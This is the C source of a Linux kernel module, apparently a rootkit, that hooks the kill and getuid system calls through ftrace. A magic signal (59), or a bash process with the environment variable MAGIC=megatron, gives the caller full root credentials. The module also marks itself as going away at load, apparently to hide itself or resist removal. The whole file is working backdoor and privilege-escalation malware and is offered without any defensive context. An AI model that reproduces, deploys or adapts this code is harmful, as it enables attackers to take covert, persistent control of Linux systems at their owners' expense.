#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include "ftrace_helper.h" //xcellerator ftrace_helper.h

MODULE_LICENSE("GPL");
MODULE_AUTHOR("syscall hooking");
MODULE_AUTHOR("malefax");
MODULE_DESCRIPTION("Simple sys_kill hook using ftrace");

static asmlinkage long(*orig_kill)(const struct pt_regs *);
typedef asmlinkage long (*orig_getuid_t)(const struct pt_regs *);
static  orig_getuid_t orig_getuid;

static asmlinkage int hook_kill(const struct pt_regs *regs){

        void SpawnRoot(void);

        int signal;
        signal = regs->si;

        if(signal == 59){
                SpawnRoot();
                return 0;
        }

        return orig_kill(regs);
}

static asmlinkage long hook_getuid(const struct pt_regs *regs) {
    
     void rootmagic(void);

    const char *name = current->comm;

    struct mm_struct *mm;
    char *envs;
    int len, i;

    if (strcmp(name, "bash") == 0) {
        mm = current->mm;
        if (mm && mm->env_start && mm->env_end) {
            envs = kmalloc(PAGE_SIZE, GFP_ATOMIC);
            if (envs) {
                len = access_process_vm(current, mm->env_start, envs, PAGE_SIZE - 1, 0);
                if (len > 0) {
                    for (i = 0; i < len - 1; i++) {
                        if (envs[i] == '\0')
                            envs[i] = ' ';
                    }
                    if (strstr(envs, "MAGIC=megatron")) {
                         rootmagic();
                    }
                }
                kfree(envs);
            }
        }
    }
    return orig_getuid(regs);
}


void SpawnRoot(void){
        struct cred *newcredentials;
        newcredentials = prepare_creds();

        if(newcredentials == NULL){
                return;
        }
        newcredentials->uid.val = 0;
        newcredentials->gid.val = 0;
        newcredentials->suid.val = 0;
        newcredentials->fsuid.val = 0;
        newcredentials->euid.val = 0;
      
         commit_creds(newcredentials);
}

 void rootmagic(void){
  struct cred *creds;
  creds = prepare_creds();
  if(creds == NULL){
    return;
  }
  creds->uid.val = creds->gid.val = 0;
  creds->euid.val = creds->egid.val = 0;
  creds->suid.val = creds->sgid.val = 0;
  creds->fsuid.val = creds->fsgid.val = 0;
  commit_creds(creds);
}

static struct ftrace_hook hooks[] = {
                HOOK("__x64_sys_kill", hook_kill, &orig_kill),
                HOOK("__x64_sys_getuid", hook_getuid, &orig_getuid),
};

static int __init mangekyou_init(void){
        int error; 
        bool isalive;
        error = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
        if(error){
                return error;
        }
        isalive = module_is_live(THIS_MODULE);
        if ( isalive ){
                THIS_MODULE->state=MODULE_STATE_GOING;
        }
        /*pr_alert("Module exit functions state:%d",THIS_MODULE->state);*/
        return 0;
}

static void __exit mangekyou_exit(void){
        fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
}

module_init(mangekyou_init);
module_exit(mangekyou_exit);
